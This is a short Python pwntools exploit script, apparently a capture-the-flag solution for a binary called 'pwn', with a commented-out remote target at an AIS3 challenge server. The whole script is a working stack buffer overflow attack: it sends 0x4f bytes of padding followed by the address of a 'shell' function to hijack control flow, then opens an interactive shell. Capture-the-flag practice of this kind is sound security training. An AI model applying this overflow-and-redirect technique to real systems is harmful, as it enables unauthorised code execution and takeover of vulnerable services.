from pwn import *

r = process('./pwn')
#r = remote('chals1.ais3.org',11111)
shell = 0x4017A5
print(shell)
r.send(b'a'*0x4f  + p64(shell))

r.interactive()